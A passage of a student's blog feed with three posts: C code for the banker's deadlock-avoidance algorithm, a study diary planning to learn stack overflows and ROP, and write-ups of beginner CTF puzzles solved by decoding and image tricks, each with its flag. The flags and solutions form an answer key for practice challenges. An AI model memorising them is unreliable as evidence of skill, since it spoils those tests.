class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void start();</span><br><span class="line">int end();</span><br><span class="line"></span><br><span class="line">int x,y,y1,c[1000],c1[1000];</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">do&#123;start();&#125;while(end());</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void start()</span><br><span class="line">&#123;</span><br><span class="line">//基本数据输入： </span><br><span class="line">int b,i,j,k,m,n,n1,f,f1;</span><br><span class="line">char ch;</span><br><span class="line">printf(&quot;请输入进程个数n：&quot;); </span><br><span class="line">scanf(&quot;%d&quot;,&amp;n);</span><br><span class="line">printf(&quot;请输入资源维数m：&quot;); </span><br><span class="line">scanf(&quot;%d&quot;,&amp;m);</span><br><span class="line">x = 0;y = n-1;</span><br><span class="line">int A[n][m],C[n][m],B[n][m],a[m],xu[m],flag[n]=&#123;0&#125;;</span><br><span class="line">int A1[n][m],C1[n][m],B1[n][m],a1[m],a2[m],xu1[m],flag1[n]=&#123;0&#125;;</span><br><span class="line">//**-------------------------------------------------------------------------------</span><br><span class="line">printf(&quot;请输入需求矩阵C：\n&quot;);</span><br><span class="line">for(i = 0;i&lt;n;i++)</span><br><span class="line">for(j = 0;j&lt;m;j++) scanf(&quot;%d&quot;,&amp;C[i][j]);</span><br><span class="line">//**-------------------------------------------------------------------------------</span><br><span class="line">printf(&quot;请输入分配矩阵A：\n&quot;);</span><br><span class="line">for(i = 0;i&lt;n;i++)&#123; </span><br><span class="line">    f = 0;</span><br><span class="line">for(j = 0;j&lt;m;j++)&#123;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;A[i][j]);</span><br><span class="line">if(A[i][j]==0)f++;//记录分配矩阵中一个进程中各维元素为0的个数 </span><br><span class="line">B[i][j] = C[i][j]-A[i][j];// B 为 C-A 伴随矩阵 </span><br><span class="line">if(f==m)&#123;</span><br><span class="line">flag[i]=1;//若全为0，则做标记 </span><br><span class="line">c[y] = i;y--;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line">//**------------------------------------------------------------------------------- </span><br><span class="line">printf(&quot;请输入当前系统可用资源量a：&quot;);</span><br><span class="line">for(i = 0;i&lt;m;i++) scanf(&quot;%d&quot;,&amp;a[i]);</span><br><span class="line">//**输出所有矩阵及可用资源量-------------------------------------------------------</span><br><span class="line">to2://*****************************************************************************************************************************to2在这 </span><br><span class="line">printf(&quot;  需 求 矩 阵        分 配 矩 阵    伴 随 矩 阵    可 用 资 源 量\n&quot;) ;</span><br><span class="line">for(i=0;i&lt;n;i++)&#123;</span><br><span class="line">if(i&gt;0)printf(&quot;\n&quot;); </span><br><span class="line">printf(&quot;进程%d：&quot;,i);</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,C[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;&quot;);</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,A[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;&quot;);</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,B[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;&quot;);</span><br><span class="line">if(i==0)&#123;</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,a[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//**-------------------------------------------------------------------------------</span><br><span class="line">printf(&quot;\n请输入即将申请资源的进程号(&lt;=n-1)：&quot;);</span><br><span class="line">//getchar();</span><br><span class="line"></span><br><span class="line">to1://*****************************************************************************************************************************to1在这 </span><br><span class="line">fflush(stdin);</span><br><span class="line">for(i=0;i&lt;1000000;i++)i++;</span><br><span class="line"></span><br><span class="line">scanf(&quot;%d&quot;,&amp;n1);</span><br><span class="line">if(n1&gt;=n)&#123;</span><br><span class="line">printf(&quot;该进程不存在,请重新输入：&quot;);</span><br><span class="line">goto to1; //就用goto </span><br><span class="line">&#125;</span><br><span class="line">//基本判断：</span><br><span class="line">//**判断1-------------------------------------------------------------------------- </span><br><span class="line">printf(&quot;请输入该进程所需的各资源量：&quot;); </span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;xu[j]); </span><br><span class="line">if(xu[j]&gt;B[n1][j])&#123;</span><br><span class="line">printf(&quot;资源请求过度，请求驳回，请输入下一资源申请进程号：&quot;);</span><br><span class="line">goto to1; //就用goto</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">//**判断2--------------------------------------------------------------------------</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">if(xu[j]&gt;a[j])&#123;</span><br><span class="line">printf(&quot;当前系统资源无法满足该资源请求，请求驳回，请输入下一资源申请进程号：&quot;);</span><br><span class="line">goto to1; //就用goto</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//**判断3--------------------------------------------------------------------------</span><br><span class="line">//首先，将新数据存入新数组，因为不安全的话要恢复数据，所以要用新数组 ，进程号: n1,申请的各资源量: xu[m] </span><br><span class="line">int f2 = 0;</span><br><span class="line">y1 = n-1;</span><br><span class="line">for(i=0;i&lt;n;i++)</span><br><span class="line">for(j=0;j&lt;m;j++)</span><br><span class="line">C1[i][j]=C[i][j];//新需求矩阵 </span><br><span class="line"></span><br><span class="line">for(i=0;i&lt;n;i++)&#123;</span><br><span class="line">f1=0;</span><br><span class="line">f2=0;</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">if(i==n1)&#123;</span><br><span class="line">A1[i][j]=A[i][j]+xu[j];//新分配矩阵 </span><br><span class="line">B1[i][j]=C1[i][j]-A1[i][j];//新伴随矩阵</span><br><span class="line">if(B1[i][j]==0)f2++; </span><br><span class="line">if(A1[i][j]==0)f1++;</span><br><span class="line">/*if(f2==m)&#123;</span><br><span class="line">a1[j]=a[j]-xu[j];</span><br><span class="line">for(k=0;k&lt;m;k++)a1[j]+=B1[i][j];</span><br><span class="line">&#125;</span><br><span class="line">else a1[j]=a[j]-xu[j];//新系统剩余资源量 */</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">A1[i][j]=A[i][j];//新分配矩阵 </span><br><span class="line">B1[i][j]=B[i][j];//新伴随矩阵</span><br><span class="line">if(B1[i][j]==0)++f2; </span><br><span class="line">if(A1[i][j]==0)++f1;</span><br><span class="line">&#125;</span><br><span class="line">//printf(&quot;\n@@@@@@@f2=%d\n&quot;,f2);</span><br><span class="line">if(i==n1 &amp;&amp; f2==m)&#123;</span><br><span class="line">//printf(&quot;\n@@@@@@@\n&quot;);</span><br><span class="line">a1[j]=a[j]-xu[j];</span><br><span class="line">for(k=0;k&lt;m;k++)a1[k]=a1[k]+A1[i][k];</span><br><span class="line">//printf(&quot;\nA1[%d]=%d&quot;,k,A1[i][k]);</span><br><span class="line">//printf(&quot;\na1[%d]=%d&quot;,k,a1[k]);</span><br><span class="line">&#125;</span><br><span class="line">else if(i==n1 &amp;&amp; f2!=m)a1[j]=a[j]-xu[j];</span><br><span class="line">/*else &#123;</span><br><span class="line">a1[j]=a[j]-xu[j];//新系统剩余资源量 </span><br><span class="line">&#125;*/</span><br><span class="line"> </span><br><span class="line">if(f1==m)&#123;</span><br><span class="line">//*****************************************************************************************这里，新标记、 弄懂c[y]在干嘛 </span><br><span class="line">flag1[i]=1;//若全为0，则做标记 </span><br><span class="line">c1[y1] = i;y1--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br><span class="line">for(i=0;i&lt;m;i++)a2[i] = a1[i];</span><br><span class="line">//for(i=0)</span><br><span class="line"></span><br><span class="line">printf(&quot;申请后的矩阵、系统资源情况如下:\n&quot;); </span><br><span class="line">printf(&quot;  需 求 矩 阵        分 配 矩 阵    伴 随 矩 阵    可 用 资 源 量\n&quot;) ;</span><br><span class="line">for(i=0;i&lt;n;i++)&#123;</span><br><span class="line">if(i&gt;0)printf(&quot;\n&quot;); </span><br><span class="line">printf(&quot;进程%d：&quot;,i);</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,C1[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;&quot;);</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,A1[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;&quot;);</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,B1[i][j]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;&quot;);</span><br><span class="line">if(i==0)&#123;</span><br><span class="line">for(j=0;j&lt;m;j++)&#123;</span><br><span class="line">printf(&quot;%4d&quot;,a1[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//**------------------------------------------------------------------------------- </span><br><span class="line">//矩阵计算，安全判断：</span><br><span class="line">b = n+1;</span><br><span class="line">x = 0;</span><br><span class="line">while(b--)&#123;//最坏情况一次只为一个程序标记flag，那么循环n次也能够标记所有能够标记的程序 </span><br><span class="line">for(i = 0;i&lt;n;i++)&#123;</span><br><span class="line"> f1 = 0; </span><br><span class="line"> if(flag1[i]==1)continue;//若该程序有标记则跳过该程序 </span><br><span class="line"> for(j = 0;j&lt;m;j++)&#123;</span><br><span class="line"> if(a2[j]&gt;=B1[i][j])f1++;</span><br><span class="line"> if(f1==m)&#123;</span><br><span class="line"> flag1[i]=1;</span><br><span class="line"> for(k=0;k&lt;m;k++)&#123;</span><br><span class="line"> a2[k] += A1[i][k];</span><br><span class="line">&#125;</span><br><span class="line">c1[x] = i;x++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//判定标记：</span><br><span class="line">f1 = 0;</span><br><span class="line">for(i = 0;i&lt;n;i++)//&#123;</span><br><span class="line">if(flag1[i]==1)f1++;</span><br><span class="line">if(f1==n)&#123;</span><br><span class="line">printf(&quot;\n此次操作为安全操作\n其中一种安全序列为：&quot;);</span><br><span class="line">for(j = 0;j&lt;n;j++)printf(&quot;%d &quot;,c1[j]);</span><br><span class="line">printf(&quot;\n是否继续进行试探[Y/N]:&quot;) ;</span><br><span class="line">getchar();</span><br><span class="line">scanf(&quot;%c&quot;,&amp;ch);</span><br><span class="line">if(ch == &#x27;Y&#x27; || ch == &#x27;y&#x27;)&#123;</span><br><span class="line">for(int i1=0;i1&lt;n;i1++)</span><br><span class="line">for(int j1=0;j1&lt;n;j1++)&#123;</span><br><span class="line">C[i1][j1]=C1[i1][j1];</span><br><span class="line">B[i1][j1]=B1[i1][j1];</span><br><span class="line">A[i1][j1]=A1[i1][j1];</span><br><span class="line">&#125;</span><br><span class="line">for(int i2=0;i2&lt;m;i2++)a[i2]=a1[i2];</span><br><span class="line">goto to2;</span><br><span class="line">&#125;</span><br><span class="line">/*printf(&quot;\n安全序列+1：&quot;);</span><br><span class="line">for(j = 0;j&lt;n;j++)printf(&quot;%d &quot;,c[j]+1);*/</span><br><span class="line">return ;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">printf(&quot;\n此次操作使系统处于不安全状态，驳回该操作\n&quot;);</span><br><span class="line">goto to2; </span><br><span class="line">&#125;</span><br><span class="line">//&#125; </span><br><span class="line">printf(&quot;存在死锁&quot;);</span><br><span class="line">return ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int end()</span><br><span class="line">&#123;</span><br><span class="line">char ch;</span><br><span class="line">printf(&quot;\n是否继续进行下一组测试？[Y/N]:&quot;);</span><br><span class="line">getchar();</span><br><span class="line">scanf(&quot;%c&quot;,&amp;ch);</span><br><span class="line">printf(&quot;*--------------------------------------------------------------------------------*\n&quot;);</span><br><span class="line">if(ch == &#x27;Y&#x27; || ch == &#x27;y&#x27;)return 1;</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例图：</p><p><img src="image-20211215215456357.png" alt="image-20211215215456357"></p><p>题目要求解析：</p><p><img src="image-20211215214324872.png" alt="image-20211215214324872"></p><p>参考链接：<a href="https://blog.csdn.net/zimojiang/article/details/80861792">https://blog.csdn.net/zimojiang/article/details/80861792</a></p><p>若存在bug，欢迎指正^_^</p><p>wx : xy1724252720</p>]]></content>
    
    
    <summary type="html">操作系统作业-银行家算法</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>xiaoxiaoNote</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/11/06/xiaoxiaoxy-Note/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/11/06/xiaoxiaoxy-Note/</id>
    <published>2021-11-06T09:12:11.000Z</published>
    <updated>2022-01-19T09:12:45.580Z</updated>
    
    <content type="html"><![CDATA[<h4 id="近期规划"><a href="#近期规划" class="headerlink" title="近期规划"></a>近期规划</h4><p>1、各个课设、eda大作业ppt（emm…老师叫我演讲╭(°A°`)╮）、期末备考</p><p>2、重温《程序员的自我修养》（编译链接与库）</p><p>（1）了解Linux ELF文件<br>（2）分析掌握栈溢出原理理解函数参数的传递过程栈空间变化<br>（3）掌握查找ROPgadget、32位和64位的exp构造<br>（4）掌握返回导向编程ROP，ret2libc、ret2_dl_resolve<br>（5）掌握linux系统延迟绑定机制：GOT、PLT查看libc库函数地址</p><p>3、计算机网络，计算机组成原理，计算机操作系统（逃不过(°A°`)）</p><p>4、至少一周研究一道pwn题</p><p>5、姐，还有些问题有空记得教我一下(*σ´∀`)σ</p><p>1）、C语言函数调用规定 *<br>2）、Pwnlib<br>3）、shellcraft *<br>4）、打shellcode</p><h1 id="2021-11-06"><a href="#2021-11-06" class="headerlink" title="2021/11/06"></a>2021/11/06</h1><p> 软考终于结束了，晚上去跑5公里庆祝一下^_^（好久没跑了，不知道还跑不跑得动）。至于软考的结果怎样不好说，就算上午的选择题侥幸能及格，下午的大题也很难过吧（毕竟下午的大题我就在上午考完后只用中午休息的时间学了一个小时，虽然效率极高，但毕竟只有一个小时），简而言之那便是——能过就是奇迹。</p><p>​        没事，虽然过不了，但收获还是挺大的，至少我对这网络工程师的考察内容已经有了一个比较清晰的框架，之后的学习中只需要按这个框架逐步地积累知识就可以了。</p><p>​        好了，先不管这软考的事了，丢到寒假再准备吧，下周二就是明月网安招新赛了，这周末挤点时间出来打点攻防世界上的题目吧， ε=(´ο｀*)))唉，作业好多啊，抄都抄不完。</p><p>​        ok，最后把想要做的事记录一下吧，以免忘记，按重要程度排序：</p><p>​        1、ctf招新赛（所以最近我的博客应该都会有题目更新）</p><p>​        2、java期中考试，得抓紧复习</p><p>​        3、装载&amp;见识一下kali Linux操作系统（不得不说，这红色的字确实帅）</p><p><img src="image-20211106181449999.png" alt="image-20211106181449999"></p><p>​        4、期末备考（及格万岁！）</p><p><img src="image-20211106180354153.png" alt="image-20211106180354153"></p><p>​        5、学习网络工程师相关知识，通过这段时间对网络工程师的备考来看，不得不说这些知识对我来说是很有用的。</p><p>​        6、英语六级（寒假再看吧）</p><p><img src="image-20211106180510834.png" alt="image-20211106180510834"></p><h1 id="2021-11-09"><a href="#2021-11-09" class="headerlink" title="2021/11/09"></a>2021/11/09</h1><h4 id="简单记录一下今天下午的比赛吧："><a href="#简单记录一下今天下午的比赛吧：" class="headerlink" title="简单记录一下今天下午的比赛吧："></a>简单记录一下今天下午的比赛吧：</h4><p>接下来记录的东西，我自己看得懂就行吧</p><p>1、windows管理员权限，修改系统文件</p><p>2、跟舍友组队打新手赛，2:1开，理论题做不了，打的都是实践题</p><p>3、网络弄崩心态：校园网一直断，不连校园网无法提交flag查看是否正确，只能一会儿热点一会儿校园网，且校园网连的比较慢，比赛场地位置不太好吧，校园网信号差</p><p>4、简单pwn题没调出来：好像远端服务器连不上去，不说太多，留个图吧</p><p><img src="image-20211109222354287.png" alt="image-20211109222354287"></p><p>5、emm…</p><p>6、最后跟舍友一起打了300分，不知道能不能排上号，但愿能进校CTF队吧</p>]]></content>
    
    
    <summary type="html">Nothing</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>misc</title>
    <link href="http://xiaoxiaoxy1.github.io/2021/11/02/misc/"/>
    <id>http://xiaoxiaoxy1.github.io/2021/11/02/misc/</id>
    <published>2021-11-02T05:39:47.000Z</published>
    <updated>2021-11-07T07:45:02.045Z</updated>
    
    <content type="html"><![CDATA[<p><strong>this_is_flag:</strong></p><p>flag就在题目描述中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;th1s_!s_a_d4m0_4la9&#125;</span><br></pre></td></tr></table></figure><p><strong>pdf：</strong></p><p>下载附件-&gt;<a href="https://smallpdf.com/cn/pdf-converter">PDF转换器 – 在线免费转换PDF文件 (smallpdf.com)</a>-&gt;转换为ppt格式下载再打开即可拖动，转换成word再下载也能看到字</p><p><img src="image-20211102134142425.png" alt="image-20211102134142425"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;security_through_obscurity&#125;</span><br></pre></td></tr></table></figure><p><strong>如来十三掌：</strong></p><p>打开附件：</p><p><img src="image-20211102134230550.png" alt="image-20211102134230550"></p><p>复制文字，进入<a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅 (keyfc.net)</a></p><p>粘贴文字并在前加上佛曰：</p><p><img src="image-20211102134250167.png" alt="image-20211102134250167"></p><p>得到一串字符，复制，百度搜索rot-13解码，这里直接复制链接在此：<a href="https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html">ROT13解码计算器 - 计算专家 (jisuan.mobi)</a></p><p><img src="image-20211102134317437.png" alt="image-20211102134317437"></p><p>再将解码结果进行Base64解码，解码器链接：<a href="https://tool.ip138.com/base64/">base64解码 base64编码 在线base64解码/编码工具 (ip138.com)</a></p><p><img src="image-20211102134332825.png" alt="image-20211102134332825"></p><p>得到flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</span><br></pre></td></tr></table></figure><p><strong>give_you_flag</strong>：</p><p>打开附件，发现动态图片，且会有一张二维码闪过，使用Snipaste（截图挺好用的，推荐下载，去Snipaste官网下载v2.6.6-Beta (2021.08.14)版本64-bit即可，使用方法自己摸索）工具，截得此图：</p><p><img src="image-20211102213300087.png" alt="image-20211102213300087"></p><p>之后再随便找一张二维码，抠出定位点</p><p><img src="image-20211102213319965.png" alt="image-20211102213319965"></p><p>拖到指定位置扫码即可</p><p><img src="image-20211102213335884.png" alt="image-20211102213335884"></p><p><img src="image-20211102213346239.png" alt="image-20211102213346239"></p><p>ok，手机扫出来了</p><p><img src="image-20211102213407832.png" alt="image-20211102213407832"></p><p>这个方法是我姐教我的，而且她说这类二维码题是CTF竞赛中的签到题，好吧，看来是我太菜了⊙∀⊙</p><p>解法二：</p><p><a href="https://blog.csdn.net/qq_40481505/article/details/89425543">https://blog.csdn.net/qq_40481505/article/details/89425543</a></p><p><a href="https://blog.csdn.net/tqydyqt/article/details/101988854">https://blog.csdn.net/tqydyqt/article/details/101988854</a></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e7d478cf6b915f50ab1277f78502a2c5&#125;</span><br></pre></td></tr></table></figure><p><strong>stegano</strong>：</p><p>下载火狐浏览器及附件，用火狐浏览器打开文件</p><p><img src="image-20211102135248023.png" alt="image-20211102135248023"></p><p>F12打开控制台，输入<strong>document.documentElement.textContent</strong>得到以下结果：</p><p><img src="image-20211102135314037.png" alt="image-20211102135314037"></p><p><strong>BABA BBB BA BBA ABA AB B AAB ABAA AB B AA BBB BA AAA BBAABB AABA ABAA AB BBA BBBAAA ABBBB BA AAAB ABBBB AAAAA ABBBB BAAA ABAA AAABB BB AAABB AAAAA AAAAA AAAAB BBA AAABB</strong></p><p>发现一大段AABABA样式的东西，猜测是01但是这些有分割，能想到的只有摩斯密码有分割的，于是尝试改成<strong>摩斯密码</strong></p><p>简单地写了一个转换器：</p><p><img src="image-20211102135403685.png" alt="image-20211102135403685"></p><p><img src="image-20211102135413534.png" alt="image-20211102135413534"></p><p><img src="image-20211102135424328.png" alt="image-20211102135424328"></p><p>百度上找一个摩斯码解码器得到flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1nv151bl3m3554g3&#125;</span><br></pre></td></tr></table></figure><p><strong>坚持60s</strong>：</p><p>下载并打开XJad(要压缩包的话联系我wx：xy1724252720)，反编译本题附件</p><p><img src="image-20211102135631579.png" alt="image-20211102135631579"></p><p>至这个目录打开文件，一个一个查找，发现flag在这里面</p><p><img src="image-20211102135646777.png" alt="image-20211102135646777"></p><p><img src="image-20211102135655848.png" alt="image-20211102135655848"></p><p>flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}</p><p>看到flag，复制过去</p><p>提交不对，看见等号，想是不是<strong>base64</strong>，解码还真是！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;DajiDali_JinwanChiji&#125;</span><br></pre></td></tr></table></figure><p><strong>gif：</strong></p><p>下载附件，解压至桌面，打开解压出来的文件夹：</p><p><img src="image-20211102135741412.png" alt="image-20211102135741412"></p><p>想到01代码，以白为0，以黑为1，进行转换</p><p>0110011001101100011000010110011101111011010001100111010101001110010111110110011101101001010001100111110101111101</p><p>[在线二进制转换字符串<a href="http://www.txttool.com/t/?id=Mzky">EN] - 转换 (txttool.com)</a></p><p><img src="image-20211102135813253.png" alt="image-20211102135813253"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;FuN_giF&#125;</span><br></pre></td></tr></table></figure><p><strong>掀桌子：</strong></p><p>题目中出现了一串神秘的字符串：</p><p>c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2</p><p>发现是数字与abcdef的组合，而我们熟知的16进制不就是由这些符号组成的吗？</p><p>接着我用以往解题的思路，拿去转换为二进制，再将二进制转字符，发现结果不对</p><p>最后通过查找别人的解法得知该题中得以两个16进制数为一组表示一个字符，但每两个二进制数的组合都大于128，而未扩展的ascll码值字符取值区间为0-128，所以要对每两个16进制数进行减128处理，再换为字符</p><p><img src="image-20211102174948168.png" alt="image-20211102174948168"></p><p>然后便有了以上脚本，运行如下：</p><p><img src="image-20211102175006281.png" alt="image-20211102175006281"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&#x27;</span></span><br><span class="line">kk = re.<span class="built_in">compile</span>(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>)</span><br><span class="line">b = re.findall(kk,a)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i,<span class="number">16</span>)-<span class="number">128</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>结合flag格式得出flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hjzcydjzbjdcjkzkcugisdchjyjsbdfr&#125;</span><br></pre></td></tr></table></figure><p>其中的re模块、findall（）函数等请自行百度查阅了解</p><p><a href="https://blog.csdn.net/qq_36556893/article/details/89182067">https://blog.csdn.net/qq_36556893/article/details/89182067</a></p><p><strong>ext3：</strong></p><p>首先，下载7-Zip</p><p>链接：<a href="https://www.7-zip.org/">https://www.7-zip.org/</a></p><p><img src="image-20211106231651844.png" alt="image-20211106231651844"></p><p>安装过程选项全默认即可，期间可能会有小差错，总之最后去你选定的安装路径查看是否安装完成，我的是下载在C盘下的Program Files文件夹中</p><p><img src="7-Zip.png" alt="7-Zip"></p><p>打开该路径</p><p><img src="image-20211106232237594.png" alt="image-20211106232237594"></p><p>有这些文件说明下载成功</p><p>接着找到已经下载好的本题的附件</p><p><img src="image-20211106232612472.png" alt="image-20211106232612472"></p><p>接着在最近下载中出现了该文件夹</p><p><img src="image-20211106232656439.png" alt="image-20211106232656439"></p><p>双击打开，搜索中输入flag并按下回车</p><p><img src="image-20211106232802773.png" 